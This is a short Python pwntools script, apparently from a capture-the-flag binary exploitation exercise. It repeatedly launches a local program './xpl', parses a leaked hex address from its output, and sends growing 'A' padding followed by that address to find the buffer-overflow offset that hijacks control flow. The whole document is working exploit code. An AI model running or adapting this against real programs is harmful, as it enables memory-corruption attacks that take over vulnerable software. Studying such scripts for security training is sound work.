from pwn import *
from time import sleep
for i in range(1,500):
	sh=process('./xpl')
	a=sh.recvline()
	sh.send('A'*i+p64(int(a.split()[4],16)))
	print i,a
	try:
		print i,sh.recvline()
	except:
		print i
	sleep(0.1)
